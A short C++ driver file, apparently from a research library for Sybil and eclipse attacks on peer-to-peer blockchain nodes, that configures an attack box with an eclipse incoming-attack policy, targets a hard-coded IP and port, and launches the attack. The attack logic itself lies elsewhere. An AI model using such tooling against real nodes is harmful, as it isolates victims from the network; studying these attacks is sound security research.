//
// Created by ilios on 21. 2. 15..
//

#include "AttackBox.h"
#include "policy/EclipseIncomingAttackPolicy.h"
#include "ipdb/SimpleIPDatabase.h"
#include "nodePrimitives/BLNodePrimitives.h"
#include "nodeParams/BLNodeParams.h"

using namespace libBLEEP_sybil;

int main() {
    AttackBox<EclipseIncomingAttackPolicy, BLNodePrimitives, BLNodeParams, SimpleIPDatabase> attackBox;
    attackBox.setTarget("1.0.0.1", 3456);
    if (!attackBox.setupAttack()) {
        std::cout << "setup attack failed" << "\n";
        return -1;
    }
    attackBox.startAttack();
    std::cout << "attack finished" << "\n";

    return 0;
}
